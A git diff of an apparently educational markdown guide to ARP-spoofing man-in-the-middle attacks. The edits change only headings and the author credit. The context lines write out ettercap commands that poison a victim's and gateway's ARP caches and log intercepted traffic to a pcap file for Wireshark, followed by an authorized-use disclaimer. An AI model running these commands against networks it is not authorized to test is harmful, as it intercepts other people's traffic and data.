@@ -48,12 +48,12 @@ Your interface → INTERFACE
 ```bash
 sudo ettercap -T -M arp:remote /VICTIM_IP/ /GATEWAY_IP/ -i INTERFACE
 ```
-###Example:
+##Example:
 ```bash
 sudo ettercap -T -M arp:remote /192.168.0.105/ /192.168.0.1/ -i eth0
 ```
 
-### :Flags Explained:
+## :Flags Explained:
 
 -T: Text (CLI) mode
 
@@ -66,7 +66,7 @@ sudo ettercap -T -M arp:remote /192.168.0.105/ /192.168.0.1/ -i eth0
 ```bash
 sudo ettercap -T -M arp:remote -w mitm_log.pcap /VICTIM_IP/ /GATEWAY_IP/ -i INTERFACE
 ```
-###Open the log with Wireshark:
+##Open the log with Wireshark:
 
 ```bash
 wireshark mitm_log.pcap
@@ -84,8 +84,10 @@ This guide is provided for educational and authorized penetration testing only.
 Unauthorized access to networks or data is illegal and punishable by law.
 Always get written permission before testing any network.
 
+
 ##📌 Author
-Created by: [Nahid Chowdury] CSE, DU
+
+Created by:Nahid Chowdury- CSE, DU
 
 For: Ethical Hacking / Cybersecurity Lab Practice
 
